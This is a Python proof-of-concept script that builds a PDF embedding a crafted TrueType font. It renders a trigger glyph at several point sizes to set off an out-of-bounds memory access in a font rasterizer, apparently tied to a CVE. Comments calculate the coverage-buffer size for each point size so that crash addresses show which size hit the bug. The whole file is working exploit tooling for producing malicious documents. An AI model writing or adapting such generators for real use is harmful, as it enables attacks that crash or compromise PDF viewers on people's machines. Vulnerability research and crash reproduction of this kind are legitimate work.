#!/usr/bin/env python3
"""Multi-parameter trigger PDF — tests multiple font sizes and glyph configs.

Renders the trigger glyph at multiple sizes on a single page. If ANY size
triggers the OOB, that specific rendering will crash. The crash log's
faulting address reveals which size triggered it.

Also tests: different page sizes, glyph positions, and rendering contexts
to find the exact conditions that trigger the FCVTZS vs XTN mismatch.
"""
import sys
import zlib

FONT = sys.argv[2] if len(sys.argv) > 2 else "neg_tx_trigger.ttf"

# Test multiple font sizes — the coverage buffer size scales with PTSIZE
# width_px = int(DX * SCALE^N * PTSIZE/UPM)
# For DX=2, SCALE=32767/16384, N=10, UPM=16384:
#   PTSIZE=1024 → width_px=127, buf=572
#   PTSIZE=512  → width_px=63,  buf=316
#   PTSIZE=2048 → width_px=255, buf=1084
#   PTSIZE=4096 → width_px=511, buf=2108
#   PTSIZE=256  → width_px=31,  buf=188
SIZES = [128, 256, 512, 768, 1024, 1536, 2048, 3072, 4096]

PAGE_W = 2000
PAGE_H = 4000

def build(dst):
    ttf = open(FONT, "rb").read()
    ttf_z = zlib.compress(ttf)

    # Render trigger glyph at each size, spread across the page
    ops = []
    for i, sz in enumerate(SIZES):
        y = PAGE_H - 200 - i * 400
        # Label
        ops.append(f"BT /F2 14 Tf 10 {y+50} Td (Size {sz}pt) Tj ET\n".encode())
        # Trigger glyph
        ops.append(f"BT /F1 {sz} Tf 200 {y} Td (A) Tj ET\n".encode())

    content = b"".join(ops)

    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] "
         b"/Resources << /Font << /F1 5 0 R /F2 8 0 R >> >> "
         b"/Contents 4 0 R >>" % (PAGE_W, PAGE_H)),
        b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream",
        b"<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont "
        b"/FirstChar 65 /LastChar 65 /Widths [100] "
        b"/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>",
        b"<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 "
        b"/FontBBox [0 0 2 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
        b"/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>",
        b"<< /Length %d /Length1 %d /Filter /FlateDecode >>\nstream\n"
        % (len(ttf_z), len(ttf)) + ttf_z + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    off = []
    for i, body in enumerate(objs, 1):
        off.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in off:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))

    open(dst, "wb").write(out)
    print(f"wrote {dst} ({len(out):,} bytes)")
    print(f"  sizes tested: {SIZES}")
    for sz in SIZES:
        wpx = int(2 * (32767/16384)**10 * sz / 16384)
        buf = 4 * (wpx + 16)
        print(f"    {sz:5d}pt → width_px={wpx:5d}, coverage_buf={buf:6d} bytes")


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "multi_trigger.pdf")
